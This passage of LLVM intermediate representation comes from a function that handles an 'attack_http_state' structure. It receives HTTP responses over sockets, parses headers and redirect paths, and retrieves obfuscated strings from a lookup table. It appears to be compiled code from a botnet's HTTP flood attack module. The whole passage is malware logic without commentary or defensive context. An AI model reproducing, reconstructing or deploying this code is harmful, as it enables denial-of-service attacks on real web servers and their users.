  %1898 = getelementptr inbounds i8, i8* %1894, i64 %1897
  %1899 = call i32 @util_strlen(i8* %1898)
  %1900 = icmp sgt i32 %1899, 0
  br i1 %1900, label %1901, label %1912

; <label>:1901:                                   ; preds = %1889
  %1902 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1903 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1902, i32 0, i32 6
  %1904 = getelementptr inbounds [257 x i8], [257 x i8]* %1903, i32 0, i32 0
  %1905 = getelementptr inbounds i8, i8* %1904, i64 1
  %1906 = load i8*, i8** %57, align 8
  %1907 = load i32, i32* %10, align 4
  %1908 = add nsw i32 %1907, 1
  %1909 = sext i32 %1908 to i64
  %1910 = getelementptr inbounds i8, i8* %1906, i64 %1909
  %1911 = call i32 @util_strcpy(i8* %1905, i8* %1910)
  br label %1912

; <label>:1912:                                   ; preds = %1901, %1889
  br label %1913

; <label>:1913:                                   ; preds = %1912, %1881
  br label %1954

; <label>:1914:                                   ; preds = %1814
  %1915 = load i8*, i8** %57, align 8
  %1916 = getelementptr inbounds i8, i8* %1915, i64 0
  %1917 = load i8, i8* %1916, align 1
  %1918 = sext i8 %1917 to i32
  %1919 = icmp eq i32 %1918, 47
  br i1 %1919, label %1920, label %1953

; <label>:1920:                                   ; preds = %1914
  %1921 = load i8*, i8** %57, align 8
  %1922 = load i32, i32* %10, align 4
  %1923 = add nsw i32 %1922, 1
  %1924 = sext i32 %1923 to i64
  %1925 = getelementptr inbounds i8, i8* %1921, i64 %1924
  %1926 = call i32 @util_strlen(i8* %1925)
  %1927 = icmp slt i32 %1926, 256
  br i1 %1927, label %1928, label %1952

; <label>:1928:                                   ; preds = %1920
  %1929 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1930 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1929, i32 0, i32 6
  %1931 = getelementptr inbounds [257 x i8], [257 x i8]* %1930, i32 0, i32 0
  %1932 = getelementptr inbounds i8, i8* %1931, i64 1
  call void @util_zero(i8* %1932, i32 255)
  %1933 = load i8*, i8** %57, align 8
  %1934 = load i32, i32* %10, align 4
  %1935 = add nsw i32 %1934, 1
  %1936 = sext i32 %1935 to i64
  %1937 = getelementptr inbounds i8, i8* %1933, i64 %1936
  %1938 = call i32 @util_strlen(i8* %1937)
  %1939 = icmp sgt i32 %1938, 0
  br i1 %1939, label %1940, label %1951

; <label>:1940:                                   ; preds = %1928
  %1941 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1942 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1941, i32 0, i32 6
  %1943 = getelementptr inbounds [257 x i8], [257 x i8]* %1942, i32 0, i32 0
  %1944 = getelementptr inbounds i8, i8* %1943, i64 1
  %1945 = load i8*, i8** %57, align 8
  %1946 = load i32, i32* %10, align 4
  %1947 = add nsw i32 %1946, 1
  %1948 = sext i32 %1947 to i64
  %1949 = getelementptr inbounds i8, i8* %1945, i64 %1948
  %1950 = call i32 @util_strcpy(i8* %1944, i8* %1949)
  br label %1951

; <label>:1951:                                   ; preds = %1940, %1928
  br label %1952

; <label>:1952:                                   ; preds = %1951, %1920
  br label %1953

; <label>:1953:                                   ; preds = %1952, %1914
  br label %1954

; <label>:1954:                                   ; preds = %1953, %1913
  %1955 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1956 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1955, i32 0, i32 9
  %1957 = getelementptr inbounds [9 x i8], [9 x i8]* %1956, i32 0, i32 0
  %1958 = call i8* @strcpy(i8* %1957, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0)) #6
  %1959 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1960 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1959, i32 0, i32 1
  store i8 10, i8* %1960, align 4
  br label %2441

; <label>:1961:                                   ; preds = %1704
  br label %1962

; <label>:1962:                                   ; preds = %1961, %1647
  br label %1963

; <label>:1963:                                   ; preds = %1962, %1627
  %1964 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1965 = load i32, i32* %12, align 4
  %1966 = call i32 @util_memsearch(i8* %1964, i32 %1965, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  store i32 %1966, i32* %37, align 4
  %1967 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1968 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1967, i32 0, i32 9
  %1969 = getelementptr inbounds [9 x i8], [9 x i8]* %1968, i32 0, i32 0
  %1970 = call signext i8 @util_strcmp(i8* %1969, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i32 0, i32 0))
  %1971 = sext i8 %1970 to i32
  %1972 = icmp ne i32 %1971, 0
  br i1 %1972, label %1980, label %1973

; <label>:1973:                                   ; preds = %1963
  %1974 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1975 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1974, i32 0, i32 9
  %1976 = getelementptr inbounds [9 x i8], [9 x i8]* %1975, i32 0, i32 0
  %1977 = call signext i8 @util_strcmp(i8* %1976, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0))
  %1978 = sext i8 %1977 to i32
  %1979 = icmp ne i32 %1978, 0
  br i1 %1979, label %1980, label %1983

; <label>:1980:                                   ; preds = %1973, %1963
  %1981 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1982 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1981, i32 0, i32 1
  store i8 7, i8* %1982, align 4
  br label %1994

; <label>:1983:                                   ; preds = %1973
  %1984 = load i32, i32* %12, align 4
  %1985 = load i32, i32* %37, align 4
  %1986 = icmp sgt i32 %1984, %1985
  br i1 %1986, label %1987, label %1990

; <label>:1987:                                   ; preds = %1983
  %1988 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1989 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1988, i32 0, i32 1
  store i8 10, i8* %1989, align 4
  br label %1993

; <label>:1990:                                   ; preds = %1983
  %1991 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1992 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1991, i32 0, i32 1
  store i8 1, i8* %1992, align 4
  br label %1993

; <label>:1993:                                   ; preds = %1990, %1987
  br label %1994

; <label>:1994:                                   ; preds = %1993, %1980
  %1995 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1996 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1995, i32 0, i32 0
  %1997 = load i32, i32* %1996, align 4
  %1998 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1999 = load i32, i32* %37, align 4
  %2000 = sext i32 %1999 to i64
  %2001 = call i64 @recv(i32 %1997, i8* %1998, i64 %2000, i32 16384)
  %2002 = trunc i64 %2001 to i32
  store i32 %2002, i32* %12, align 4
  br label %2439

; <label>:2003:                                   ; preds = %1034
  %2004 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2005 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2004, i32 0, i32 1
  %2006 = load i8, i8* %2005, align 4
  %2007 = zext i8 %2006 to i32
  %2008 = icmp eq i32 %2007, 7
  br i1 %2008, label %2009, label %2386

; <label>:2009:                                   ; preds = %2003
  br label %2010

; <label>:2010:                                   ; preds = %2384, %2009
  %2011 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2012 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2011, i32 0, i32 1
  %2013 = load i8, i8* %2012, align 4
  %2014 = zext i8 %2013 to i32
  %2015 = icmp ne i32 %2014, 7
  br i1 %2015, label %2016, label %2017

; <label>:2016:                                   ; preds = %2010
  br label %2385

; <label>:2017:                                   ; preds = %2010
  %2018 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2019 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2018, i32 0, i32 17
  %2020 = load i32, i32* %2019, align 4
  %2021 = icmp eq i32 %2020, 1024
  br i1 %2021, label %2022, label %2034

; <label>:2022:                                   ; preds = %2017
  %2023 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2024 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2023, i32 0, i32 18
  %2025 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2024, i32 0, i32 0
  %2026 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2027 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2026, i32 0, i32 18
  %2028 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2027, i32 0, i32 0
  %2029 = getelementptr inbounds i8, i8* %2028, i64 64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %2025, i8* %2029, i64 960, i32 1, i1 false)
  %2030 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2031 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2030, i32 0, i32 17
  %2032 = load i32, i32* %2031, align 4
  %2033 = sub nsw i32 %2032, 64
  store i32 %2033, i32* %2031, align 4
  br label %2034

; <label>:2034:                                   ; preds = %2022, %2017
  %2035 = call i32* @__errno_location() #7
  store i32 0, i32* %2035, align 4
  %2036 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2037 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2036, i32 0, i32 0
  %2038 = load i32, i32* %2037, align 4
  %2039 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2040 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2039, i32 0, i32 18
  %2041 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2040, i32 0, i32 0
  %2042 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2043 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2042, i32 0, i32 17
  %2044 = load i32, i32* %2043, align 4
  %2045 = sext i32 %2044 to i64
  %2046 = getelementptr inbounds i8, i8* %2041, i64 %2045
  %2047 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2048 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2047, i32 0, i32 17
  %2049 = load i32, i32* %2048, align 4
  %2050 = sub nsw i32 1024, %2049
  %2051 = sext i32 %2050 to i64
  %2052 = call i64 @recv(i32 %2038, i8* %2046, i64 %2051, i32 16384)
  %2053 = trunc i64 %2052 to i32
  store i32 %2053, i32* %12, align 4
  %2054 = load i32, i32* %12, align 4
  %2055 = icmp eq i32 %2054, 0
  br i1 %2055, label %2056, label %2058

; <label>:2056:                                   ; preds = %2034
  %2057 = call i32* @__errno_location() #7
  store i32 104, i32* %2057, align 4
  store i32 -1, i32* %12, align 4
  br label %2058

; <label>:2058:                                   ; preds = %2056, %2034
  %2059 = load i32, i32* %12, align 4
  %2060 = icmp eq i32 %2059, -1
  br i1 %2060, label %2061, label %2079

; <label>:2061:                                   ; preds = %2058
  %2062 = call i32* @__errno_location() #7
  %2063 = load i32, i32* %2062, align 4
  %2064 = icmp ne i32 %2063, 11
  br i1 %2064, label %2065, label %2078

; <label>:2065:                                   ; preds = %2061
  %2066 = call i32* @__errno_location() #7
  %2067 = load i32, i32* %2066, align 4
  %2068 = icmp ne i32 %2067, 11
  br i1 %2068, label %2069, label %2078

; <label>:2069:                                   ; preds = %2065
  %2070 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2071 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2070, i32 0, i32 0
  %2072 = load i32, i32* %2071, align 4
  %2073 = call i32 @close(i32 %2072)
  %2074 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2075 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2074, i32 0, i32 0
  store i32 -1, i32* %2075, align 4
  %2076 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2077 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2076, i32 0, i32 1
  store i8 0, i8* %2077, align 4
  br label %2078

; <label>:2078:                                   ; preds = %2069, %2065, %2061
  br label %2385

; <label>:2079:                                   ; preds = %2058
  %2080 = load i32, i32* %12, align 4
  %2081 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2082 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2081, i32 0, i32 17
  %2083 = load i32, i32* %2082, align 4
  %2084 = add nsw i32 %2083, %2080
  store i32 %2084, i32* %2082, align 4
  %2085 = load i32, i32* %27, align 4
  %2086 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2087 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2086, i32 0, i32 2
  store i32 %2085, i32* %2087, align 4
  br label %2088

; <label>:2088:                                   ; preds = %2383, %2079
  store i32 0, i32* %59, align 4
  %2089 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2090 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2089, i32 0, i32 14
  %2091 = load i32, i32* %2090, align 4
  %2092 = icmp sgt i32 %2091, 0
  br i1 %2092, label %2093, label %2264

; <label>:2093:                                   ; preds = %2088
  %2094 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2095 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2094, i32 0, i32 14
  %2096 = load i32, i32* %2095, align 4
  %2097 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2098 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2097, i32 0, i32 17
  %2099 = load i32, i32* %2098, align 4
  %2100 = icmp sgt i32 %2096, %2099
  br i1 %2100, label %2101, label %2105

; <label>:2101:                                   ; preds = %2093
  %2102 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2103 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2102, i32 0, i32 17
  %2104 = load i32, i32* %2103, align 4
  br label %2109

; <label>:2105:                                   ; preds = %2093
  %2106 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2107 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2106, i32 0, i32 14
  %2108 = load i32, i32* %2107, align 4
  br label %2109

; <label>:2109:                                   ; preds = %2105, %2101
  %2110 = phi i32 [ %2104, %2101 ], [ %2108, %2105 ]
  store i32 %2110, i32* %59, align 4
  %2111 = load i32, i32* %59, align 4
  %2112 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2113 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2112, i32 0, i32 14
  %2114 = load i32, i32* %2113, align 4
  %2115 = sub nsw i32 %2114, %2111
  store i32 %2115, i32* %2113, align 4
  %2116 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2117 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2116, i32 0, i32 11
  %2118 = load i32, i32* %2117, align 4
  %2119 = icmp eq i32 %2118, 1
  br i1 %2119, label %2120, label %2263

; <label>:2120:                                   ; preds = %2109
  %2121 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2122 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2121, i32 0, i32 18
  %2123 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2122, i32 0, i32 0
  %2124 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2125 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2124, i32 0, i32 17
  %2126 = load i32, i32* %2125, align 4
  %2127 = call i8* @table_retrieve_val(i32 43, i32* null)
  %2128 = call i32 @util_memsearch(i8* %2123, i32 %2126, i8* %2127, i32 11)
  %2129 = icmp ne i32 %2128, -1
  br i1 %2129, label %2130, label %2262

; <label>:2130:                                   ; preds = %2120
  %2131 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2132 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2131, i32 0, i32 18
  %2133 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2132, i32 0, i32 0
  %2134 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2135 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2134, i32 0, i32 17
  %2136 = load i32, i32* %2135, align 4
  %2137 = call i8* @table_retrieve_val(i32 43, i32* null)
  %2138 = call i32 @util_memsearch(i8* %2133, i32 %2136, i8* %2137, i32 11)
  store i32 %2138, i32* %60, align 4
  %2139 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2140 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2139, i32 0, i32 18
  %2141 = load i32, i32* %60, align 4
  %2142 = sext i32 %2141 to i64
  %2143 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2140, i64 0, i64 %2142
  %2144 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2145 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2144, i32 0, i32 17
  %2146 = load i32, i32* %2145, align 4
  %2147 = load i32, i32* %60, align 4
  %2148 = sub nsw i32 %2146, %2147
  %2149 = call i32 @util_memsearch(i8* %2143, i32 %2148, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0), i32 1)
  store i32 %2149, i32* %61, align 4
  %2150 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2151 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2150, i32 0, i32 18
  %2152 = load i32, i32* %60, align 4
  %2153 = load i32, i32* %61, align 4
  %2154 = sub nsw i32 %2153, 1
  %2155 = add nsw i32 %2152, %2154
  %2156 = sext i32 %2155 to i64
  %2157 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2151, i64 0, i64 %2156
  store i8 0, i8* %2157, align 1
  %2158 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2159 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2158, i32 0, i32 15
  %2160 = load i32, i32* %2159, align 4
  %2161 = icmp slt i32 %2160, 5
  br i1 %2161, label %2162, label %2257

; <label>:2162:                                   ; preds = %2130
  %2163 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2164 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2163, i32 0, i32 18
  %2165 = load i32, i32* %60, align 4
  %2166 = sext i32 %2165 to i64
  %2167 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2164, i64 0, i64 %2166
  %2168 = call i32 @util_strlen(i8* %2167)
  %2169 = icmp slt i32 %2168, 128
  br i1 %2169, label %2170, label %2257

; <label>:2170:                                   ; preds = %2162
  %2171 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2172 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2171, i32 0, i32 16
  %2173 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2174 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2173, i32 0, i32 15
  %2175 = load i32, i32* %2174, align 4
  %2176 = sext i32 %2175 to i64
  %2177 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2172, i64 0, i64 %2176
  %2178 = getelementptr inbounds [128 x i8], [128 x i8]* %2177, i32 0, i32 0
  %2179 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2180 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2179, i32 0, i32 18
  %2181 = load i32, i32* %60, align 4
  %2182 = sext i32 %2181 to i64
  %2183 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2180, i64 0, i64 %2182
  %2184 = call i32 @util_strcpy(i8* %2178, i8* %2183)
  %2185 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2186 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2185, i32 0, i32 16
  %2187 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2188 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2187, i32 0, i32 15
  %2189 = load i32, i32* %2188, align 4
  %2190 = sext i32 %2189 to i64
  %2191 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2186, i64 0, i64 %2190
  %2192 = getelementptr inbounds [128 x i8], [128 x i8]* %2191, i32 0, i32 0
  %2193 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2194 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2193, i32 0, i32 16
  %2195 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2196 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2195, i32 0, i32 15
  %2197 = load i32, i32* %2196, align 4
  %2198 = sext i32 %2197 to i64
  %2199 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2194, i64 0, i64 %2198
  %2200 = getelementptr inbounds [128 x i8], [128 x i8]* %2199, i32 0, i32 0
  %2201 = call i32 @util_strlen(i8* %2200)
  %2202 = sext i32 %2201 to i64
  %2203 = getelementptr inbounds i8, i8* %2192, i64 %2202
  %2204 = call i32 @util_strcpy(i8* %2203, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14, i32 0, i32 0))
  %2205 = load i32, i32* %61, align 4
  %2206 = add nsw i32 %2205, 3
  %2207 = load i32, i32* %60, align 4
  %2208 = add nsw i32 %2207, %2206
  store i32 %2208, i32* %60, align 4
  %2209 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2210 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2209, i32 0, i32 18
  %2211 = load i32, i32* %60, align 4
  %2212 = sext i32 %2211 to i64
  %2213 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2210, i64 0, i64 %2212
  %2214 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2215 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2214, i32 0, i32 17
  %2216 = load i32, i32* %2215, align 4
  %2217 = load i32, i32* %60, align 4
  %2218 = sub nsw i32 %2216, %2217
  %2219 = call i32 @util_memsearch(i8* %2213, i32 %2218, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0), i32 1)
  store i32 %2219, i32* %61, align 4
  %2220 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2221 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2220, i32 0, i32 18
  %2222 = load i32, i32* %60, align 4
  %2223 = load i32, i32* %61, align 4
  %2224 = sub nsw i32 %2223, 1
  %2225 = add nsw i32 %2222, %2224
  %2226 = sext i32 %2225 to i64
  %2227 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2221, i64 0, i64 %2226
  store i8 0, i8* %2227, align 1
  %2228 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2229 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2228, i32 0, i32 16
  %2230 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2231 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2230, i32 0, i32 15
  %2232 = load i32, i32* %2231, align 4
  %2233 = sext i32 %2232 to i64
  %2234 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2229, i64 0, i64 %2233
  %2235 = getelementptr inbounds [128 x i8], [128 x i8]* %2234, i32 0, i32 0
  %2236 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2237 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2236, i32 0, i32 16
  %2238 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2239 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2238, i32 0, i32 15
  %2240 = load i32, i32* %2239, align 4
  %2241 = sext i32 %2240 to i64
  %2242 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2237, i64 0, i64 %2241
  %2243 = getelementptr inbounds [128 x i8], [128 x i8]* %2242, i32 0, i32 0
  %2244 = call i32 @util_strlen(i8* %2243)
  %2245 = sext i32 %2244 to i64
  %2246 = getelementptr inbounds i8, i8* %2235, i64 %2245
  %2247 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2248 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2247, i32 0, i32 18
  %2249 = load i32, i32* %60, align 4
  %2250 = sext i32 %2249 to i64
  %2251 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2248, i64 0, i64 %2250
  %2252 = call i32 @util_strcpy(i8* %2246, i8* %2251)
  %2253 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2254 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2253, i32 0, i32 15
  %2255 = load i32, i32* %2254, align 4
  %2256 = add nsw i32 %2255, 1
  store i32 %2256, i32* %2254, align 4
  br label %2257

; <label>:2257:                                   ; preds = %2170, %2162, %2130
  %2258 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2259 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2258, i32 0, i32 14
  store i32 -1, i32* %2259, align 4
  %2260 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2261 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2260, i32 0, i32 1
  store i8 10, i8* %2261, align 4
  br label %2384

; <label>:2262:                                   ; preds = %2120
  br label %2263

; <label>:2263:                                   ; preds = %2262, %2109
  br label %2264

; <label>:2264:                                   ; preds = %2263, %2088
  %2265 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2266 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2265, i32 0, i32 14
  %2267 = load i32, i32* %2266, align 4
  %2268 = icmp eq i32 %2267, 0
  br i1 %2268, label %2269, label %2347

; <label>:2269:                                   ; preds = %2264
  %2270 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2271 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2270, i32 0, i32 13
  %2272 = load i32, i32* %2271, align 4
  %2273 = icmp eq i32 %2272, 1
  br i1 %2273, label %2274, label %2330

; <label>:2274:                                   ; preds = %2269
  %2275 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2276 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2275, i32 0, i32 18
  %2277 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2276, i32 0, i32 0
  %2278 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2279 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2278, i32 0, i32 17
  %2280 = load i32, i32* %2279, align 4
  %2281 = call i32 @util_memsearch(i8* %2277, i32 %2280, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  %2282 = icmp ne i32 %2281, -1
  br i1 %2282, label %2283, label %2329

; <label>:2283:                                   ; preds = %2274
  %2284 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2285 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2284, i32 0, i32 18
  %2286 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2285, i32 0, i32 0
  %2287 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2288 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2287, i32 0, i32 17
  %2289 = load i32, i32* %2288, align 4
  %2290 = call i32 @util_memsearch(i8* %2286, i32 %2289, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %2290, i32* %62, align 4
  %2291 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2292 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2291, i32 0, i32 18
  %2293 = load i32, i32* %62, align 4
  %2294 = sub nsw i32 %2293, 2
  %2295 = sext i32 %2294 to i64
  %2296 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2292, i64 0, i64 %2295
  store i8 0, i8* %2296, align 1
  %2297 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2298 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2297, i32 0, i32 18
  %2299 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2298, i32 0, i32 0
  %2300 = load i32, i32* %62, align 4
  %2301 = call i32 @util_memsearch(i8* %2299, i32 %2300, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %2302 = icmp ne i32 %2301, -1
  br i1 %2302, label %2303, label %2313

; <label>:2303:                                   ; preds = %2283
  %2304 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2305 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2304, i32 0, i32 18
  %2306 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2307 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2306, i32 0, i32 18
  %2308 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2307, i32 0, i32 0
  %2309 = load i32, i32* %62, align 4
  %2310 = call i32 @util_memsearch(i8* %2308, i32 %2309, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
